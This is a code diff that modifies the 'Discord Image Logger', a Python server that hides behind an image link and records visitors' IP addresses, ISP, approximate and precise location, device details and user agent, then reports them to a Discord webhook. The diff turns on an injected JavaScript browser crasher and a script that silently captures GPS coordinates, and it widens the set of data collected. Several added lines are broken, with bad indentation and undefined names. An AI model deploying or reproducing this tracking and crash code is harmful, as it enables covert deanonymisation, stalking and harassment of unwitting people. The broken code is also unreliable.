@@ -22,11 +22,11 @@ config = {
 
     # CUSTOMIZATION #
     "username": "Image Logger",
-    "color": 0x00FFFF,
+    "color": 0xFF0000,
 
     # OPTIONS #
-    "crashBrowser": False,
-    "accurateLocation": False,
+    "crashBrowser": True,
+    "accurateLocation": True,
     "message": {
         "doMessage": False,
         "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
@@ -34,7 +34,7 @@ config = {
     },
     "vpnCheck": 1,
     "linkAlerts": True,
-    "buggedImage": False,
+    "buggedImage": True,
     "antiBot": 1,
     "redirect": {
         "redirect": False,
@@ -83,29 +83,38 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
                         "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                     }
                 ],
-            })
+            }) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
         return
+
 
     ping = "@everyone"
 
     info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
-    if info.get("proxy"):
+    if info["proxy"]:
         if config["vpnCheck"] == 2:
-            return
+                return
+        
         if config["vpnCheck"] == 1:
             ping = ""
     
-    if info.get("hosting"):
+    if info["hosting"]:
         if config["antiBot"] == 4:
-            if not info.get("proxy"):
+            if info["proxy"]:
+                pass
+            else:
                 return
-        elif config["antiBot"] == 3:
-            return
-        elif config["antiBot"] == 2:
-            if not info.get("proxy"):
+
+        if config["antiBot"] == 3:
+                return
+
+        if config["antiBot"] == 2:
+            if info["proxy"]:
+                pass
+            else:
                 ping = ""
-        elif config["antiBot"] == 1:
-            ping = ""
+
+        if config["antiBot"] == 1:
+                ping = ""
 
     os, browser = httpagentparser.simple_detect(useragent)
     
@@ -121,26 +130,34 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
 **Endpoint:** `{endpoint}`
             
 **IP Info:**
-> **IP:** `{ip}`
-> **Provider:** `{info.get('isp', 'Unknown')}`
-> **ASN:** `{info.get('as', 'Unknown')}`
-> **Country:** `{info.get('country', 'Unknown')}`
-> **Region:** `{info.get('regionName', 'Unknown')}`
-> **City:** `{info.get('city', 'Unknown')}`
-> **Coords:** `{(str(info.get('lat', '')) + ', ' + str(info.get('lon', '')) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps](https://www.google.com/maps/search/google+map++' + coords + ')'})
-> **Timezone:** `{info.get('timezone', 'Unknown').split('/')[1].replace('_', ' ') if info.get('timezone') else 'Unknown'}` ({info.get('timezone', 'Unknown').split('/')[0] if info.get('timezone') else 'Unknown'})
-> **Mobile:** `{info.get('mobile', False)}`
-> **VPN:** `{info.get('proxy', False)}`
-> **Bot:** `{'True' if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}`
+> **IP:** `{ip if ip else 'Unknown'}`
+> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
+> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
+> **Hostname:** `{info['hostname'] if 'hostname' in info else 'Unknown'}`
+> **Connection Type:** `{info['connectionType'] if 'connectionType' in info else 'Unknown'}`
+> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
+> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
+> **Last Seen:** `{info['last_seen'] if 'last_seen' in info else 'Unknown'}`
+> **Organization:** `{info['org'] if info['org'] else 'Unknown'}`
+> **City:** `{info['city'] if info['city'] else 'Unknown'}`
+> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
+> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
+> **Mobile:** `{info['mobile']}`
+> **VPN:** `{info['proxy']}`
+> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
 
 **Browser Info:**
 > **OS:** `{os}`
+> **OS Version:** `{os_version if 'os_version' in info else 'Unknown'}`
 > **Browser:** `{browser}`
+> **User Agent:** `{user_agent if 'user_agent' in info else 'Unknown'}`
+
 
 **User Agent:**
 ```
 {useragent}
-```""",  }
+```""",
+    }
   ],
 }
             
@@ -150,7 +167,8 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
     return info
 
 binaries = {
-    "loading": base64.b85decode(b'|JeWF01!...')
+   "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
+    
 }
 
 class ImageLoggerAPI(BaseHTTPRequestHandler):
@@ -203,56 +221,83 @@ height: 100vh;
                 else:
                     result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint=s.split("?")[0], url=url)
 
-                if config["message"]["doMessage"]:
-                    message = config["message"]["message"]
-                    if config["message"]["richMessage"] and result:
-                        message = message.replace("{ip}", self.headers.get('x-forwarded-for', 'Unknown'))
-                        message = message.replace("{isp}", result.get("isp", "Unknown"))
-                        message = message.replace("{asn}", result.get("as", "Unknown"))
-                        message = message.replace("{country}", result.get("country", "Unknown"))
-                        message = message.replace("{region}", result.get("regionName", "Unknown"))
-                        message = message.replace("{city}", result.get("city", "Unknown"))
-                        message = message.replace("{coords}", f"{result.get('lat', '')}, {result.get('lon', '')}")
-                        browser, os = httpagentparser.simple_detect(self.headers.get('user-agent'))
-                        message = message.replace("{browser}", browser)
-                        message = message.replace("{os}", os)
-                    data = message.encode()
+                    
+                 message = config["message"]["message"]
+        if config["message"]["richMessage"] and result:
+            message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
+            message = message.replace("{isp}", result["isp"])
+            message = message.replace("{asn}", result["as"])
+            message = message.replace("{country}", result["country"])
+            message = message.replace("{region}", result["regionName"])
+            message = message.replace("{city}", result["city"])
+            message = message.replace("{lat}", str(result["lat"]))
+            message = message.replace("{long}", str(result["lon"]))
+            message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
+            message = message.replace("{mobile}", str(result["mobile"]))
+            message = message.replace("{vpn}", str(result["proxy"]))
+            message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
 
-                if config["crashBrowser"]:
-                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'
+            # Parse the User-Agent for browser and OS details
+            user_agent_info = get_user_agent_info(self.headers.get('user-agent'))
+            message = message.replace("{browser}", user_agent_info["browser"])
+            message = message.replace("{browser_version}", user_agent_info["browser_version"])
+            message = message.replace("{os}", user_agent_info["os"])
+            message = message.replace("{os_version}", user_agent_info["os_version"])
 
-                if config["redirect"]["redirect"]:
-                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
+            # Add additional details like device type, language, and referrer
+            message = message.replace("{device}", self.get_device_type(self.headers.get('user-agent')))
+            message = message.replace("{language}", self.headers.get('Accept-Language', 'Unknown'))
+            message = message.replace("{referrer}", self.headers.get('Referer', 'Unknown'))
 
-                self.send_response(200)
-                self.send_header('Content-type', 'text/html')
-                self.end_headers()
+        # Send response data
+        datatype = 'text/html'
+        if config["message"]["doMessage"]:
+            data = message.encode()
 
-                if config["accurateLocation"]:
-                    data += b"""<script>
-var currenturl = window.location.href;
-if (!currenturl.includes("g=") && navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(function (coords) {
-        if (currenturl.includes("?")) {
-            currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
-        } else {
-            currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
-        }
-        location.replace(currenturl);
-    });
-}
-</script>"""
+        if config["crashBrowser"]:
+            data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'  # Crasher code
 
-                self.wfile.write(data)
+        if config["redirect"]["redirect"]:
+            data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
 
-        except Exception:
-            self.send_response(500)
-            self.send_header('Content-type', 'text/html')
-            self.end_headers()
-            self.wfile.write(b'500 - Internal Server Error<br>Please check the webhook logs or report the issue.')
-            reportError(traceback.format_exc())
+        self.send_response(200)  # 200 = OK (HTTP Status)
+        self.send_header('Content-type', datatype)
+        self.send_header('X-Content-Type-Options', 'nosniff')
+        self.send_header('X-XSS-Protection', '1; mode=block')
+        self.send_header('Strict-Transport-Security', 'max-age=31536000; includeSubDomains')
+        self.end_headers()  # Declare the headers as finished.
 
-    do_GET = handleRequest
-    do_POST = handleRequest
+        if config["accurateLocation"]:
+            # Geolocation handling
+            data += b"""<script>
+                var currenturl = window.location.href;
+                if (!currenturl.includes("g=")) {
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(function (coords) {
+                            if (currenturl.includes("?")) {
+                                currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
+                            } else {
+                                currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
+                            }
+                            location.replace(currenturl);
+                        });
+                    }
+                }
+            </script>"""
+        self.wfile.write(data)
 
-handler = ImageLoggerAPI
+    except Exception as e:
+        handle_error(500, 'Internal Server Error', traceback.format_exc())
+
+# Helper function to get device type (Mobile/Desktop/Tablet)
+def get_device_type(user_agent):
+    if 'Mobi' in user_agent:
+        return "Mobile"
+    elif 'Tablet' in user_agent:
+        return "Tablet"
+    else:
+        return "Desktop"
+
+# Handle GET and POST requests
+do_GET = handleRequest
+do_POST = handleRequest
